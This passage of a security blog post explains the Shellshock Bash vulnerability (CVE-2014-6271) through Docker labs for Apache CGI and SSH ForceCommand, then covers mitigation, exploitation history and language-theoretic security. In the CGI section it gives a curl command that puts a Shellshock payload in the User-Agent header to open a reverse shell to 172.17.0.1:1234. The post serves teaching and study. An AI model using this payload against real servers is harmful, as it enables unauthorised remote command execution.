&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;IfModule mime_module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ForceType application/x-httpd-cgi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;/IfModule&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/Directory&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We also need to tell the server that what files are CGI files. For that we will use the &lt;code>AddHandler&lt;/code> directive:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>AddHandler cgi-script .sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>For testing purposes, we’ll create a &lt;code>ping.sh&lt;/code> script that accepts an IP address from the client, runs &lt;code>ping&lt;/code> on it, and returns the output.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/usr/bin/bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IP&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;%s&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$QUERY_STRING&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | sed -n &lt;span style="color:#b8bb26">&amp;#39;s/^ip=\([^&amp;amp;]*\).*/\1/p&amp;#39;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PING_OUT&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>ping -c &lt;span style="color:#d3869b">2&lt;/span> -- &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$IP&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Content-type: text/html\n\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;%s&amp;#34;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$PING_OUT&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">printf&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;\n\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;div class="alert alert-note collapsed">
&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
&lt;i class="bx bx-info-circle">&lt;/i>
&lt;p class="alert-heading">
Note
&lt;/p>
&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
&lt;/div>
&lt;div class="alert-content" style="display: none;" >
&lt;p>Note that we have added &lt;code>--&lt;/code> before the user input. According to &lt;a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html">POSIX&lt;/a>, anything after the &lt;code>--&lt;/code> should be considered as operands to the program. Because &lt;code>ping&lt;/code> complies with this standard, there would be no way to exploit it for command execution—if it weren&amp;rsquo;t for Shellshock.&lt;/p>
&lt;/div>
&lt;/div>
&lt;script>
function toggleAlert(headerElement) {
var alertBox = headerElement.parentElement;
var alertContent = alertBox.querySelector('.alert-content');
var icon = headerElement.querySelectorAll('i')[1];
alertBox.classList.toggle('open');
alertBox.classList.toggle('collapsed');
if (alertBox.classList.contains('open')) {
alertContent.style.display = 'block';
icon.classList.remove('open');
icon.classList.add('collapsed');
} else {
icon.classList.remove('collapsed');
icon.classList.add('open');
alertContent.style.display = 'none';
}
}
&lt;/script>
&lt;p>With this, now we can set up a Docker container for testing. After running Docker, send a request with the Shellshock payload inside the &lt;code>User-Agent&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl -ik &lt;span style="color:#b8bb26">&amp;#39;http://localhost:8080/cgi-bin/ping.sh?ip=google.com&amp;#39;&lt;/span> &lt;span style="color:#b8bb26">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#b8bb26">&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#39;User-Agent: () { :; };/usr/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/1234 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250714160303.webp">&lt;/figure>
&lt;p>This works because Apache parses the &lt;code>User-Agent&lt;/code> and assigns its value to the &lt;code>HTTP_USER_AGENT&lt;/code> environment variable. When the server spawns a new Bash process with these environment variables, our payload will be executed as well.&lt;/p>
&lt;h3 id="secure-shell-ssh">Secure Shell (SSH)&lt;/h3>
&lt;p>SSH is a service that can be used to securely access a shell on a remote host. We can use it to log in to a different host and execute commands in that system. You might ask: if SSH itself provides shell access, then what is the purpose of using Shellshock to get a shell? This is a valid question in most cases where SSH is configured to allow full shell access. However, there are instances where the server is configured to restrict users from accessing a normal shell. Instead, it provides a restricted shell, where only specific commands or scripts are allowed to execute as a particular user. The &lt;code>ForceCommand&lt;/code> directive in the &lt;code>sshd_config&lt;/code> file is used for this purpose. Most commonly this feature is used to run automated tasks when a specific user logs into the machine.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>Match user backup_user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ForceCommand /usr/local/bin/backup.sh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PermitTTY no
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This directive will execute the &lt;code>backup.sh&lt;/code> script whenever the &lt;code>backup_user&lt;/code> logs in through SSH. &lt;code>backup_user&lt;/code> is only there to do the backup, and the &lt;code>PermitTTY no&lt;/code> directive ensures that the user does not get full shell access.&lt;/p>
&lt;p>There&amp;rsquo;s also a feature in SSH that allows users to pass environment variables to the system. This also needs some additional configuration in the &lt;code>sshd_config&lt;/code> file of the server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>PermitUserEnvironment yes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AcceptEnv USER_ENV
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With these, users can pass the &lt;code>USER_ENV&lt;/code> environment variable into the server. By default the &lt;code>PermitUserEnvironment&lt;/code> is set to &lt;code>no&lt;/code> since it can be used to bypass access restrictions in some configurations even without a Shellshock vulnerability. For example, by overwriting environment variables like &lt;code>LD_PRELOAD&lt;/code>, &lt;code>LD_LIBRARY_PATH&lt;/code>, etc., a user can load malicious shared libraries and overwrite system calls. A safer alternative is to use the &lt;code>AcceptEnv&lt;/code> directive, which allows only whitelisted environment variables to be copied into the system.&lt;/p>
&lt;p>Now imagine an SSH server that is set up to run a shell script every time a user logs in using the &lt;code>ForceCommand&lt;/code> directive, where either the &lt;code>PermitUserEnvironment&lt;/code> or &lt;code>AcceptEnv&lt;/code> is set. If the server is using a vulnerable Bash version and we know the password of the user, then we can pass a crafted environment variable and pass it to the server using &lt;code>-o SendEnv=VAR&lt;/code>. Which will trigger Shellshock and bypass the restriction to get full shell access.&lt;/p>
&lt;p>I have created a Docker lab setup to test this, which you can access &lt;a href="https://github.com/h4r1337/cve-labs/tree/main/CVE-2014-6271/ssh">here in my GitHub&lt;/a>.
For this lab I created a simple bash script that will just print a welcome message and exit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/usr/bin/env bash
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Welcome to my SSH Server&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;========================&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Maintenance: &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Unfortunately the server is under maintenance, come back later&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">exit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then added these configurations in the &lt;code>/etc/ssh/sshd_config&lt;/code> file:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Enable root login&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PermitRootLogin yes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Disable TTY access&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PermitTTY no
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Allow environment variable&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AcceptEnv LANG LC_&lt;span style="color:#fe8019">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># Command to execute on login.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># There&amp;#39;s no Match directive specified, so by default all &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic"># users will execute this script on login.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ForceCommand &lt;span style="color:#fe8019">/&lt;/span>sbin&lt;span style="color:#fe8019">/&lt;/span>welcome_script&lt;span style="color:#fe8019">.&lt;/span>sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
&lt;img src="https://h4r1337.github.io/img/shellshock/Pasted%20image%2020250731145458.webp">&lt;/figure>
&lt;p>There are more attack vectors, which we won&amp;rsquo;t explore in this blog (maybe in the future). I will list some of them here, if you want to explore it yourself:&lt;/p>
&lt;ul>
&lt;li>DHCP&lt;/li>
&lt;li>Mail services&lt;/li>
&lt;li>Open VPN&lt;/li>
&lt;/ul>
&lt;h2 id="mitigation">Mitigation&lt;/h2>
&lt;p>The initial patch introduced by the maintainer of Bash didn&amp;rsquo;t fix the core issue entirely, and people started to find various other related but different parsing bugs. After Shellshock, with the new knowledge that merely having the shell parse arbitrary environment variables is exploitable, people realized that the Bash parser was an attack surface. With this realization people began trying standard techniques like fuzzing to quickly find new vulnerabilities in the parser.&lt;/p>
&lt;p>The one quick fix used to fix Shellshock was to disable function export entirely. This was done by adding the &lt;code>-p&lt;/code> flag, which makes the process run in privileged mode.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">-&lt;/span>p Turn on privileged mode&lt;span style="color:#fe8019">.&lt;/span> In this mode, the &lt;span style="color:#fe8019">$&lt;/span>ENV &lt;span style="color:#fe8019">and&lt;/span> &lt;span style="color:#fe8019">$&lt;/span>BASH_ENV files
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> are &lt;span style="color:#fe8019">not&lt;/span> processed, shell functions are &lt;span style="color:#fe8019">not&lt;/span> inherited from the
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> environment, &lt;span style="color:#fe8019">and&lt;/span> the SHELLOPTS, BASHOPTS, CDPATH, &lt;span style="color:#fe8019">and&lt;/span> GLOBIGNORE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> variables, &lt;span style="color:#fe8019">if&lt;/span> they appear &lt;span style="color:#fe8019">in&lt;/span> the environment, are ignored&lt;span style="color:#fe8019">.&lt;/span> If the
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shell is started with the effective user (group) id &lt;span style="color:#fe8019">not&lt;/span> equal to the
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> real user (group) id, &lt;span style="color:#fe8019">and&lt;/span> the &lt;span style="color:#fe8019">-&lt;/span>p option is &lt;span style="color:#fe8019">not&lt;/span> supplied, these
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> actions are taken &lt;span style="color:#fe8019">and&lt;/span> the effective user id is set to the real user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> id&lt;span style="color:#fe8019">.&lt;/span> If the &lt;span style="color:#fe8019">-&lt;/span>p option is supplied at startup, the effective user id
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> is &lt;span style="color:#fe8019">not&lt;/span> reset&lt;span style="color:#fe8019">.&lt;/span> Turning this option off causes the effective user &lt;span style="color:#fe8019">and&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> group ids to be set to the real user &lt;span style="color:#fe8019">and&lt;/span> group ids&lt;span style="color:#fe8019">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you remember from the &lt;a href="#Root%20Cause%20Analysis">Root Cause Analysis&lt;/a> section, shell functions are only parsed if the &lt;code>privmode&lt;/code> variable is set to 0. So this is a valid fix to Shellshock. But more often than not, developers needed this feature, and temporarily disabling function export doesn&amp;rsquo;t fix the underlying vulnerability.&lt;/p>
&lt;p>On September 25, Florian Weimer, a researcher from Red Hat, posted an &lt;a href="https://www.openwall.com/lists/oss-security/2014/09/25/13">unofficial patch&lt;/a> addressing Shellshock and its variants. In that patch, he addressed the issue and found a general solution to it by only parsing functions if the name starts with a prefix &lt;code>BASH_FUNC_&lt;/code> and ends with a suffix &lt;code>()&lt;/code>. Soon people realized that separating shell functions into their own special namespace would fix the underlying issue, and most implementations used this prefix + suffix fix.&lt;/p>
&lt;h2 id="beyond-shellshock">Beyond Shellshock&lt;/h2>
&lt;h3 id="in-the-wild-exploits">In the wild exploits&lt;/h3>
&lt;p>Considering the simplicity of the vulnerability, it is surprising that this bug remained hidden for about 25 years, dating back to version 1.03, released in September 1989. A direct follow-up question would be if anyone else knew about this vulnerability and if it was being exploited prior to its public disclosure. As in the case of Shellshock, unlike other similar (in the case of mass exploitation) vulnerabilities like the infamous Heartbleed, which leaves no trace, Shellshock activities can be clearly logged and easily detected. However, we haven&amp;rsquo;t come across any official evidence or reports of its use in public. Still, we cannot entirely rule out the possibility of in-the-wild exploitation since, if Shellshock gave attackers full system access, they would likely take measures to avoid detection and clear all the logs considering its exploitability. But it is highly unlikely that no mistakes would be made by the attackers that leave behind at least some trace of evidence.&lt;/p>
&lt;p>Even if you argue that nation-state threat actors wouldn&amp;rsquo;t leave any traces behind, they didn&amp;rsquo;t have such advanced Opsec techniques all the time. Even today nation-states tend to make mistakes and leave traces behind on various attacks. Therefore, it is extremely doubtful that they had such techniques before 2014. And as for the case of finding the Shellshock vulnerability, &lt;a href="https://seclists.org/oss-sec/2014/q4/224">Stéphane Chazelas himself stated&lt;/a> that he did not find the vulnerability by reading Bash source code. No one in their sane mind would think of auditing Bash source code; &lt;a href="http://www.openwall.com/lists/oss-security/2014/10/07/26">as Michal Zalewski put it&lt;/a>, it wouldn&amp;rsquo;t be much better than auditing &lt;code>/bin/uname&lt;/code>. Even if you knew Bash parses arbitrary environment variables incorrectly, it would take a much greater realization to find out that this incorrect parsing of a shell environment variable poses a significant security risk.&lt;/p>
&lt;p>In the end Shellshock is caused due to its ambiguous design and parser implementation choices, as well as its failure to maintain proper separation of code and data. Bash alone cannot be blamed for this; third parties using it for configuration made this subtle parser quirk even more severe. Which brings us to &lt;a href="https://langsec.org/">LangSec.&lt;/a>&lt;/p>
&lt;h3 id="language-theoretic-security-and-mismorphisms">Language theoretic security and mismorphisms&lt;/h3>
&lt;blockquote>
&lt;p>But if you can prove that the input for program A
constructs a turing complete grammar you have already lost.
You cannot &amp;ldquo;fix&amp;rdquo; these bugs, as there is an infinite number of them.
You need to fix the parsers and the languages first.&lt;/p>
&lt;/blockquote>
&lt;p>I think this is the right time to mention langsec research. &lt;a href="https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf">As this paper states&lt;/a>, &amp;ldquo;Mismorphisms—instances where predicates take on different truth values across different interpretations of reality (notably, different actors’ perceptions of reality and the actual reality)—are the source of weird instructions.&amp;rdquo;&lt;/p>
&lt;p>The syntax used to export static variables can also be applied to export shell functions, which the interpreter then parses and executes. This broke the assumption that values in these contexts would be treated purely as data, creating a false sense of security. Third parties like Apache CGI, SSH, etc. began using this feature for managing configurations, which now contains untrusted user inputs, creating a weird machine. Adding to this is the fact that the parser is broken, allowing a user to append arbitrary commands after the function definition, which the parser then executes.&lt;/p>
&lt;p>Seen through the langsec lens, much more can be learned about secure software development. Shellshock is a great example of how layering convenient features across components (e.g., Apache -&amp;gt; CGI -&amp;gt; Bash) builds accidental weird machines.&lt;/p>
&lt;hr>
&lt;p>That&amp;rsquo;s it for today. While researching this one, I found many informative discussions, articles, and research papers. All of them are listed below.&lt;/p>
&lt;p>Go through it if you want to learn about the various perspectives and opinions of people on this incident. I especially recommend reading this particular &lt;a href="https://dwheeler.com/essays/shellshock.html">essay&lt;/a>, which goes far beyond Shellshock and provides general information as well as various measures to prevent such vulnerabilities in the future.&lt;/p>
&lt;h4 id="references">References&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="https://www.cve.org/CVERecord?id=CVE-2014-6271">https://www.cve.org/CVERecord?id=CVE-2014-6271&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://infosecnirvana.com/attack-vectors-used-shellshock/">https://infosecnirvana.com/attack-vectors-used-shellshock/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://dwheeler.com/essays/shellshock.html">https://dwheeler.com/essays/shellshock.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347">https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells/171347#171347&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://seclists.org/oss-sec/2014/q3/650">https://seclists.org/oss-sec/2014/q3/650&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://httpd.apache.org/docs/2.4/howto/cgi.html">https://httpd.apache.org/docs/2.4/howto/cgi.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.openwall.com/lists/oss-security/2014/10/07/23">https://www.openwall.com/lists/oss-security/2014/10/07/23&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://lists.openwall.net/full-disclosure/2014/10/01/10">https://lists.openwall.net/full-disclosure/2014/10/01/10&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://security.stackexchange.com/questions/166903/is-there-evidence-of-shellshock-being-exploited-before-its-public-announcement">https://security.stackexchange.com/questions/166903/is-there-evidence-of-shellshock-being-exploited-before-its-public-announcement&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf">https://www.cs.dartmouth.edu/~sws/pubs/aisw2019.pdf&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>